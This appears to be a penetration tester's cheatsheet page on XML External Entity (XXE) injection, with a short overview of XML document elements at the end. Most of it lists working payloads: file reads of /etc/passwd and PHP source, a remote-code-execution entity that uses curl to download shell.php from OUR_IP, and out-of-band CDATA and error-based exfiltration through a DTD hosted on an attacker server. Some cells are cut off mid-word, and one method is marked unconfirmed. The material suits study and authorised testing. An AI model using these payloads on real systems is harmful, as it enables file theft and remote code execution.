# Cheatsheet


| ***Command***                                                                                                                                                                                                                                                                                                                                           | ***Usage***                                                                                                                                                                                                |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `<!DOCTYPE variable-name SYSTEM "http://inlanefreight.com/email.dtd">`                                                                                                                                                                                                                                                                                  | Referencing an External DTD file (contains XML data                                                                                                                                                        |
| ```xml<br><!DOCTYPE variable-name [<br>  <!ENTITY field1 SYSTEM "http://localhost/company.txt"><br>]><br>```<br><br>The entity is later ferenced using `&<entity>;`                                                                                                                                                                                     | Making a custom Entity/variable<br><br>External XML entities require the `SYSTEM` keywo                                                                                                                    |
| `expect://id`<br>OR<br>`<!ENTITY variable-name SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">`<br>                                                                                                                                                                                                                                                 | Performing RCE with XXE. <br>Second method ***unconfirmed***.                                                                                                                                              |

## LFI with XXE


| ***Command***                                                                                                                                                                                                                                                                                                                                        | ***Usage***                                                                                                                                                                                                                                   |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `<!ENTITY variable-name SYSTEM "file:///etc/passwd">`                                                                                                                                                                                                                                                                                                | Performing basic LFI.                                                                                                                                                                                                                         |
| `<!ENTITY variable-name SYSTEM "php://filter/convert.base64-encode/resource=index.php">`                                                                                                                                                                                                                                                             | Reading source code.<br><br>Requires base64 encoding since characters in pages mess up the XML fo                                                                                                                                             |
| ```<br><!DOCTYPE email [<br>  <!ENTITY % begin "<![CDATA["><br>  <!ENTITY % file SYSTEM "file:///var/www/html/index.php"> <br>  <!ENTITY % end "]]>"><br>  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"><br>  %xxe;<br>]><br>```<br><br>Run a server with the following file: <br>`echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd`<br> | Exfilteration with `CDATA`.<br><br>Payload to print data/ Read source code even if it would break XML syntax.<br><br>Running the xxe.dtd file is necessary since XML prevents joining internal and external entities. This way bypasses that. |
| ```<br><!DOCTYPE email [ <br>  <!ENTITY % remote SYSTEM "http://OUR_IP:PORT/xxe.dtd"><br>  %remote;<br>  %error;<br>]><br>```<br><br>Host on machine:<br>```<br><!ENTITY % file SYSTEM "file:///etc/hosts"><br><!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>"><br>```<br><br>                                              | **ERROR** based XXE. Might be finnicky with larger files.<br><br>Choose smaller files to exfilterate such as `/etc/hosts`.                                                                                                                    |
|                                                                                                                                                                                                                                                                                                                                                      |                                                                                                                                                                                                                                               |

# Related Pages

[[SSRF]]: XXE can be combined with SSRF to enumerate local open ports and view pages.

# Overview

`XML External Entity (XXE) Injection` vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it.

`XML Document Type Definition (DTD)` allows the validation of an XML document against a pre-defined document structure.

## Key Elements of an XML Document
| Key           | Definition                                                                                                      | Example                                  |
| ------------- | --------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| `Tag`         | The **keys** of an XML document, usually wrapped with (`<`/`>`) characters.                                     | `<date>`                                 |
| `Entity`      | **XML variables**, usually wrapped with (`&`/`;`) characters.                                                   | `&lt;`                                   |
| `Element`     | The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.   | `<date>01-01-2022</date>`                |
| `Attribute`   | Optional specifications for any element that are stored in the tags, which may be used by the XML parser.       | `version="1.0"`/`encoding="UTF-8"`       |
| `Declaration` | Usually the **first line of an XML document**, and defines the XML version and encoding to use when parsing it. | `<?xml version="1.0" encoding="UTF-8"?>` |
